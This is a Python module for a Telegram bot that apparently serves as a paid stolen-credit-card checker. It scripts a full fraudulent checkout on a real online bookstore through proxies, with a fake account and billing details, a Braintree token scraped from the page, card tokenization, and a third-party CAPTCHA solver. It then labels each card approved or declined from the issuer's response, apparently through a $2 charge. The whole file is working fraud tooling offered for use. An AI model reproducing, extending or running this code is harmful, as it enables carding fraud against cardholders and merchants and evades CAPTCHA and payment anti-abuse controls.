import json, base64, asyncio, aiohttp, time
from src.extras.checklib import MakeGate, ScrapInfo
from datetime import datetime
from twocaptcha import TwoCaptcha as captcha
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode

name_gate = "Braintree_Charged"
subtype = "2.00$ Charged"
command = "bet"


@Client.on_message(
    filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False)
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    asyncio.gather(get_live(card, msg))


async def get_live(card, msg):

    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_split = MakeGate(card).get_card_details()
    ccn = card_split[0]
    month = card_split[1]
    year = card_split[2]
    if len(year) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]

    initial_time = time.time()
    data_bin = await MakeGate(card).bin_lookup()

    proxy = ScrapInfo().proxy_session()
    email = ScrapInfo().email_generator()
    proxy = ScrapInfo().proxy_session()

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Request: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    async with aiohttp.ClientSession() as session:

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.onceuponatimebooks.com",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        data = {
            "quantity": "1",
            "productId": "2179732",
            "_token": "3bwdpoLQPMSVJZzmyxLIH4JTa8XUpO5KnLRgROrs",
        }

        async with session.post(
            "https://www.onceuponatimebooks.com/cart",
            headers=headers,
            data=data,
            proxy=proxy,
        ) as response:
            msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccn}:{month}:{year}:{cvv}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
            await msg.edit_text(
                msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True
            )

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        async with session.get(
            "https://www.onceuponatimebooks.com/cart", headers=headers, proxy=proxy
        ) as response:

            token_site = ScrapInfo().getStr(
                await response.text(), '_token" value="', '">'
            )

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third Request: Creating an account ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/login",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        async with session.get(
            "https://www.onceuponatimebooks.com/account/create",
            headers=headers,
            proxy=proxy,
        ) as response:
            pass

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth Request: Creating an account ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.onceuponatimebooks.com",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/account/create",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        data = {
            "_token": token_site,
            "intended_route": "https://www.onceuponatimebooks.com/login",
            "fname": "Leonel",
            "lname": "Molina",
            "phone": "123467889",
            "email": email,
            "password": "Holkgold",
            "retype": "Holkgold",
            "country_id": "840",
            "addressOne": "894 Av park",
            "addressTwo": "",
            "city": "New York",
            "state_id": "33",
            "zip": "10080",
            "agreement_accepted": "on",
        }

        async with session.post(
            "https://www.onceuponatimebooks.com/account/create",
            headers=headers,
            data=data,
            proxy=proxy,
        ) as response:
            pass

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fifth Request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        async with session.get(
            "https://www.onceuponatimebooks.com/cart", headers=headers, proxy=proxy
        ) as response:
            pass

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ sixth Request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/cart",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        async with session.get(
            "https://www.onceuponatimebooks.com/checkout", headers=headers, proxy=proxy
        ) as response:
            pass

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Seventh Request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.onceuponatimebooks.com",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/checkout",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        data = {
            "_token": token_site,
            "billing[first_name]": "Leonel",
            "billing[last_name]": "Molina",
            "billing[email]": email,
            "billing[phone]": "123467889",
            "billing[address1]": "Res. Villa Constitucion",
            "billing[address2]": "",
            "billing[city]": "New York",
            "billing[country]": "840",
            "billing[state]": "33",
            "billing[zip]": "10080",
            "same_as_billing": "on",
            "shipping[id]": "-1",
            "shipping[name]": "",
            "shipping[first_name]": "",
            "shipping[last_name]": "",
            "shipping[address1]": "",
            "shipping[address2]": "",
            "shipping[city]": "",
            "shipping[country]": "840",
            "shipping[state]": "",
            "shipping[zip]": "",
            "payment_num": "",
        }

        async with session.post(
            "https://www.onceuponatimebooks.com/checkout/step1",
            headers=headers,
            data=data,
            proxy=proxy,
        ) as response:
            pass

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Eight Request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.onceuponatimebooks.com",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/checkout/step2",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        data = {
            "_token": token_site,
            "ship_method": "18",
            "payment_num": "",
        }

        async with session.post(
            "https://www.onceuponatimebooks.com/checkout/step2",
            headers=headers,
            data=data,
            proxy=proxy,
        ) as response:
            pass

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Nineth Request (step 4) ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.onceuponatimebooks.com",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/checkout/step3",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        data = {
            "_token": token_site,
            "payment_method": "13",
            "payment_num": "",
        }

        async with session.post(
            "https://www.onceuponatimebooks.com/checkout/step3",
            headers=headers,
            data=data,
            proxy=proxy,
        ) as response:
            getting_bearer = ScrapInfo().getStr(
                await response.text(), 'gateway_bt_token = "', '";'
            )
            authorization_decode = str(base64.b64decode(getting_bearer).decode("utf-8"))
            real_authorization = ScrapInfo().getStr(
                authorization_decode, '"authorizationFingerprint":"', '",'
            )
            site_key = ScrapInfo().getStr(
                await response.text(), 'data-sitekey="', '"></div>'
            )

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Tenth Request (step 5) ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        headers = {
            "accept": "*/*",
            "accept-language": "es-419,es;q=0.9",
            "authorization": f"Bearer {real_authorization}",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "priority": "u=1, i",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        json_data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "4d8bc0b8-29fd-4fea-b069-2bdea1d92a0b",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": ccn,
                        "expirationMonth": month,
                        "expirationYear": year,
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "10080",
                        },
                    },
                    "options": {
                        "validate": False,
                    },
                },
            },
            "operationName": "TokenizeCreditCard",
        }

        async with session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
        ) as response:
            nonce = ScrapInfo().getStr(await response.text(), 'token":"', '",')

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Eleventh Request (step 5) ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        # solvin captcha
        solvin_captcha = ScrapInfo().captcha_solver(
            "https://www.onceuponatimebooks.com/checkout/step4", site_key
        )
        if "Captcha Error" in solvin_captcha:
            await msg.edit_text(solvin_captcha, parse_mode=ParseMode.MARKDOWN)
        else:
            g_captcha = solvin_captcha[0]
            captchaId = solvin_captcha[1]

        # solver = captcha(api_key)

        # try:
        #     captcha_response = solver.recaptcha(
        #         site_key, "https://www.onceuponatimebooks.com/checkout/step4"
        #     )
        # except Exception as e:
        #     await msg.edit_text(f"Captcha Error: {e}", parse_mode=ParseMode.MARKDOWN)
        #     return
        # else:
        #     g_captcha = json.dumps(captcha_response["code"])
        #     g_captcha = ScrapInfo().getStr(g_captcha, '"', '"')
        #     captcha_id = json.dumps(captcha_response["captchaId"])
        #     captchaId = ScrapInfo().getStr(captcha_id, '"', '"')

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.onceuponatimebooks.com",
            "priority": "u=0, i",
            "referer": "https://www.onceuponatimebooks.com/checkout/step4",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        }

        data = {
            "_token": token_site,
            "comment": "",
            "agreement_accepted": "on",
            "payment_num": "",
            "payment_method_nonce": nonce,
            "deviceData": '{"correlation_id":"4d8bc0b8-29fd-4fea-b069-2bdea1d9"}',
            "g-recaptcha-response": g_captcha,
        }

        async with session.post(
            "https://www.onceuponatimebooks.com/checkout/step4",
            headers=headers,
            data=data,
            proxy=proxy,
        ) as response:
            error = ScrapInfo().getStr(
                await response.text(),
                '<div class="alert alert-danger text-center" role="alert">',
                "</div>",
            )

            if "Card Issuer Declined CVV" in error:
                msgx = "APPROVED CCN✅"
                respuesta = "Card Issuer Declined CVV"

            elif "Insufficient Funds" in error:
                msgx = "APPROVED CCV✅"
                respuesta = "Insufficient Funds"

            elif "Gateway Rejected: avs" in error:
                msgx = "APPROVED ✅"
                respuesta = "Gateway Rejected: avs"

            elif "Gateway Rejected: avs_and_cvv" in error:
                msgx = "APPROVED ✅"
                respuesta = "Gateway Rejected: avs_and_cvv"

            else:
                respuesta = error
                msgx = "DECLINED ❌"

            final_time = time.time() - initial_time

            card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {respuesta}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""

            await msg.edit_text(
                card_response,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
